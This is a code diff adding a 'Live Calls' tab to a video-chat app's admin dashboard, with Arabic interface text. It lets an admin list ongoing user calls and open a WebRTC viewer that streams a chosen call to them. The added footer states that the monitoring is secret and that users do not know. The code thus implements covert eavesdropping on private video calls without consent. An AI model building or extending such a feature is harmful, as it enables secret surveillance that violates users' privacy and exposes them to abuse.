@@ -1,7 +1,7 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { trpc } from '@/lib/trpc';
 import { useLocation } from 'wouter';
-import { Users, Globe, Crown, RefreshCw, ArrowRight, Lock, Shield, Eye, EyeOff } from 'lucide-react';
+import { Users, Globe, Crown, RefreshCw, ArrowRight, Lock, Shield, Eye, EyeOff, Video, Radio, X, MonitorPlay } from 'lucide-react';
 
 const ADMIN_SESSION_KEY = 'admin_mode';
 
@@ -149,8 +149,206 @@ function PasswordGate({ onVerified }: { onVerified: () => void }) {
 /* ══════════════════════════════════════════════════════════
    Admin Dashboard
 ══════════════════════════════════════════════════════════ */
+
+/* ══════════════════════════════════════════════════════════
+   Live Calls Monitor
+══════════════════════════════════════════════════════════ */
+interface ActiveCall {
+  peerId1: string; name1: string; avatar1: string; userId1?: number;
+  peerId2: string; name2: string; avatar2: string; userId2?: number;
+}
+
+const WATCH_ICE_CONFIG: RTCConfiguration = {
+  iceServers: [
+    { urls: 'stun:stun.l.google.com:19302' },
+    { urls: 'stun:stun1.l.google.com:19302' },
+    { urls: 'turn:openrelay.metered.ca:80',  username: 'openrelayproject', credential: 'openrelayproject' },
+    { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
+  ],
+};
+
+function CallWatcher({ call, token, onClose }: { call: ActiveCall; token: string; onClose: () => void }) {
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const watcherId = useRef(`w-${Math.random().toString(36).slice(2)}`).current;
+  const [status, setStatus] = useState<'connecting'|'watching'|'error'>('connecting');
+
+  useEffect(() => {
+    const pc = new RTCPeerConnection(WATCH_ICE_CONFIG);
+
+    pc.ontrack = (e) => {
+      if (videoRef.current && e.streams[0]) {
+        videoRef.current.srcObject = e.streams[0];
+        setStatus('watching');
+      }
+    };
+
+    pc.onicecandidate = (e) => {
+      if (!e.candidate) return;
+      fetch('/api/admin/watch-signal', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token, watcherId, type: 'ice', data: e.candidate }),
+      }).catch(() => {});
+    };
+
+    const params = new URLSearchParams({ token, watcherId, targetPeerId: call.peerId1 });
+    const es = new EventSource(`/api/admin/watch-stream?${params}`);
+
+    es.onmessage = async (e) => {
+      try {
+        const msg = JSON.parse(e.data);
+        if (msg.type === 'watch-offer') {
+          await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
+          const answer = await pc.createAnswer();
+          await pc.setLocalDescription(answer);
+          await fetch('/api/admin/watch-signal', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, watcherId, type: 'answer', data: answer }),
+          });
+        } else if (msg.type === 'watch-ice') {
+          try { await pc.addIceCandidate(new RTCIceCandidate(msg.data)); } catch {}
+        }
+      } catch {}
+    };
+    es.onerror = () => setStatus('error');
+
+    const timeout = setTimeout(() => setStatus(s => s === 'connecting' ? 'error' : s), 20000);
+    return () => { clearTimeout(timeout); es.close(); pc.close(); };
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  const avt1 = call.avatar1 || `https://api.dicebear.com/7.x/avataaars/svg?seed=${call.peerId1}`;
+  const avt2 = call.avatar2 || `https://api.dicebear.com/7.x/avataaars/svg?seed=${call.peerId2}`;
+
+  return (
+    <div style={{ position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.88)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center', padding:'16px' }}>
+      <div style={{ backgroundColor:'#0f172a', borderRadius:'20px', border:'1px solid #1e293b', width:'100%', maxWidth:'480px', overflow:'hidden' }}>
+        {/* Header */}
+        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'12px 16px', borderBottom:'1px solid #1e293b', background:'linear-gradient(135deg,#4c1d95,#831843)' }}>
+          <div style={{ display:'flex', alignItems:'center', gap:'8px' }}>
+            <Radio style={{ width:'16px', height:'16px', color:'#f472b6' }} />
+            <span style={{ color:'white', fontWeight:700, fontSize:'14px' }}>مراقبة مباشرة</span>
+            {status === 'watching' && (
+              <span style={{ backgroundColor:'#dc2626', color:'white', fontSize:'10px', fontWeight:900, padding:'2px 6px', borderRadius:'99px', animation:'pulse 1.5s infinite' }}>LIVE</span>
+            )}
+          </div>
+          <div style={{ display:'flex', alignItems:'center', gap:'8px' }}>
+            <img src={avt1} style={{ width:'22px', height:'22px', borderRadius:'50%', border:'2px solid white' }} />
+            <img src={avt2} style={{ width:'22px', height:'22px', borderRadius:'50%', border:'2px solid white' }} />
+            <span style={{ color:'white', fontSize:'12px', fontWeight:600 }}>{call.name1} ↔ {call.name2}</span>
+            <button onClick={onClose} style={{ background:'none', border:'none', cursor:'pointer', color:'white', padding:'4px' }}>
+              <X style={{ width:'18px', height:'18px' }} />
+            </button>
+          </div>
+        </div>
+        {/* Video */}
+        <div style={{ position:'relative', backgroundColor:'#000', aspectRatio:'16/9', display:'flex', alignItems:'center', justifyContent:'center' }}>
+          <video ref={videoRef} autoPlay playsInline style={{ width:'100%', height:'100%', objectFit:'cover', display: status==='watching'?'block':'none' }} />
+          {status !== 'watching' && (
+            <div style={{ textAlign:'center', color:'white' }}>
+              {status === 'connecting' ? (
+                <>
+                  <div style={{ width:'32px', height:'32px', border:'3px solid #7c3aed', borderTopColor:'white', borderRadius:'50%', animation:'spin 0.8s linear infinite', margin:'0 auto 8px' }} />
+                  <p style={{ margin:0, fontSize:'13px', color:'#9ca3af' }}>جاري الاتصال...</p>
+                </>
+              ) : (
+                <>
+                  <X style={{ width:'32px', height:'32px', color:'#ef4444', margin:'0 auto 8px', display:'block' }} />
+                  <p style={{ margin:0, fontSize:'13px', color:'#9ca3af' }}>فشل الاتصال أو المستخدم أنهى المكالمة</p>
+                </>
+              )}
+            </div>
+          )}
+        </div>
+        <p style={{ margin:0, padding:'10px 16px', textAlign:'center', fontSize:'11px', color:'#6b7280' }}>
+          🔒 المراقبة سرية — المستخدمون لا يعلمون
+        </p>
+      </div>
+    </div>
+  );
+}
+
+function LiveCallsTab({ token }: { token: string }) {
+  const [calls, setCalls] = useState<ActiveCall[]>([]);
+  const [stats, setStats] = useState({ online: 0, waiting: 0 });
+  const [loading, setLoading] = useState(true);
+  const [watching, setWatching] = useState<ActiveCall | null>(null);
+
+  useEffect(() => {
+    const fetch_ = async () => {
+      try {
+        const r = await fetch(`/api/admin/active-calls?token=${encodeURIComponent(token)}`);
+        const d = await r.json();
+        setCalls(d.calls || []);
+        setStats({ online: d.online || 0, waiting: d.waiting || 0 });
+      } catch {}
+      setLoading(false);
+    };
+    fetch_();
+    const id = setInterval(fetch_, 5000);
+    return () => clearInterval(id);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  return (
+    <div>
+      {/* Stats */}
+      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'10px', marginBottom:'16px' }}>
+        {[
+          { icon: <Radio style={{ width:'18px', height:'18px', color:'#f472b6', margin:'0 auto 4px', display:'block' }} />, value: calls.length, label:'مكالمات حية', bg:'#1e1b4b', border:'#3730a3', color:'#818cf8' },
+          { icon: <div style={{ width:'8px', height:'8px', borderRadius:'50%', backgroundColor:'#22c55e', margin:'5px auto 4px', boxShadow:'0 0 6px #22c55e' }} />, value: stats.online, label:'متصلون', bg:'#052e16', border:'#166534', color:'#4ade80' },
+          { icon: <div style={{ width:'8px', height:'8px', borderRadius:'50%', backgroundColor:'#f97316', margin:'5px auto 4px' }} />, value: stats.waiting, label:'بانتظار', bg:'#431407', border:'#9a3412', color:'#fb923c' },
+        ].map((s, i) => (
+          <div key={i} style={{ backgroundColor:s.bg, border:`1px solid ${s.border}`, borderRadius:'14px', padding:'12px', textAlign:'center' }}>
+            {s.icon}
+            <p style={{ margin:0, fontSize:'26px', fontWeight:900, color:'white' }}>{s.value}</p>
+            <p style={{ margin:0, fontSize:'11px', color:s.color }}>{s.label}</p>
+          </div>
+        ))}
+      </div>
+      {/* List */}
+      <div style={{ backgroundColor:'#111827', border:'1px solid #374151', borderRadius:'16px', overflow:'hidden' }}>
+        <div style={{ padding:'12px 16px', borderBottom:'1px solid #1f2937', display:'flex', alignItems:'center', gap:'8px' }}>
+          <MonitorPlay style={{ width:'16px', height:'16px', color:'#f472b6' }} />
+          <span style={{ color:'#e5e7eb', fontWeight:700, fontSize:'14px' }}>المكالمات الجارية</span>
+          <span style={{ marginRight:'auto', fontSize:'11px', color:'#4b5563' }}>تحديث تلقائي كل 5 ثوانٍ</span>
+        </div>
+        {loading ? (
+          <div style={{ padding:'40px', textAlign:'center' }}>
+            <div style={{ width:'28px', height:'28px', border:'3px solid #7c3aed', borderTopColor:'white', borderRadius:'50%', animation:'spin 0.8s linear infinite', margin:'0 auto' }} />
+          </div>
+        ) : calls.length === 0 ? (
+          <div style={{ padding:'48px', textAlign:'center', color:'#4b5563' }}>
+            <Video style={{ width:'40px', height:'40px', margin:'0 auto 12px', display:'block', opacity:0.3 }} />
+            <p style={{ margin:0, fontSize:'14px' }}>لا توجد مكالمات نشطة حالياً</p>
+          </div>
+        ) : calls.map((call, i) => (
+          <div key={i} style={{ display:'flex', alignItems:'center', gap:'12px', padding:'12px 16px', borderBottom:'1px solid #1f2937' }}>
+            <div style={{ display:'flex', position:'relative', width:'56px', flexShrink:0 }}>
+              <img src={call.avatar1||`https://api.dicebear.com/7.x/avataaars/svg?seed=${call.peerId1}`} style={{ width:'32px', height:'32px', borderRadius:'50%', border:'2px solid #1f2937', backgroundColor:'#374151' }} />
+              <img src={call.avatar2||`https://api.dicebear.com/7.x/avataaars/svg?seed=${call.peerId2}`} style={{ width:'32px', height:'32px', borderRadius:'50%', border:'2px solid #1f2937', backgroundColor:'#374151', position:'absolute', right:0 }} />
+            </div>
+            <div style={{ flex:1, minWidth:0 }}>
+              <p style={{ margin:0, fontSize:'14px', fontWeight:600, color:'white', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
+                {call.name1} <span style={{ color:'#6b7280' }}>↔</span> {call.name2}
+              </p>
+              <p style={{ margin:0, fontSize:'11px', color:'#4b5563', marginTop:'2px' }}>مكالمة فيديو مباشرة</p>
+            </div>
+            <button onClick={() => setWatching(call)} style={{ display:'flex', alignItems:'center', gap:'5px', backgroundColor:'#7c3aed', color:'white', border:'none', borderRadius:'10px', padding:'7px 12px', cursor:'pointer', fontSize:'12px', fontWeight:700, flexShrink:0 }}>
+              <Eye style={{ width:'14px', height:'14px' }} />
+              مراقبة
+            </button>
+          </div>
+        ))}
+      </div>
+      {watching && <CallWatcher call={watching} token={token} onClose={() => setWatching(null)} />}
+    </div>
+  );
+}
+
 function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [, setLocation] = useLocation();
+  const [activeTab, setActiveTab] = useState<'users'|'livecalls'>('users');
+  const adminToken = sessionStorage.getItem(ADMIN_SESSION_KEY) || '';
 
   const { data: registrations, isLoading: regLoading, refetch, isFetching } =
     trpc.admin.newRegistrations.useQuery(50, { refetchInterval: 30_000 });
@@ -220,6 +418,20 @@ function AdminDashboard({ onLogout }: { onLogout: () => void }) {
           <Shield style={{ width: '18px', height: '18px', color: '#a78bfa' }} />
           <span style={{ color: '#c4b5fd', fontSize: '13px', fontWeight: 700 }}>دخلت كمدير — صلاحيات كاملة</span>
         </div>
+
+        {/* Tabs */}
+        <div style={{ display:'flex', gap:'6px', marginBottom:'20px', backgroundColor:'#111827', padding:'4px', borderRadius:'14px', border:'1px solid #374151' }}>
+          {([
+            { id:'users',     label:'المستخدمون',   icon:<Users style={{ width:'14px', height:'14px' }} />,  color:'#7c3aed' },
+            { id:'livecalls', label:'مكالمات حية',  icon:<Radio style={{ width:'14px', height:'14px' }} />,  color:'#be185d' },
+          ] as const).map(tab => (
+            <button key={tab.id} onClick={() => setActiveTab(tab.id)} style={{ flex:1, padding:'9px', borderRadius:'10px', border:'none', cursor:'pointer', fontWeight:700, fontSize:'13px', backgroundColor: activeTab===tab.id ? tab.color : 'transparent', color: activeTab===tab.id ? 'white' : '#6b7280', display:'flex', alignItems:'center', justifyContent:'center', gap:'6px' }}>
+              {tab.icon}{tab.label}
+            </button>
+          ))}
+        </div>
+
+        {activeTab === 'livecalls' ? <LiveCallsTab token={adminToken} /> : <>
 
         {/* Stats Cards */}
         <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: '12px', marginBottom: '20px' }}>
@@ -308,12 +520,14 @@ function AdminDashboard({ onLogout }: { onLogout: () => void }) {
           )}
         </div>
 
+        </>}
+
         <p style={{ textAlign: 'center', color: '#374151', fontSize: '11px', marginTop: '16px', paddingBottom: '24px' }}>
           يتحدث تلقائياً كل 30 ثانية
         </p>
       </div>
 
-      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+      <style>{`@keyframes spin { to { transform: rotate(360deg); } } @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }`}</style>
     </div>
   );
 }
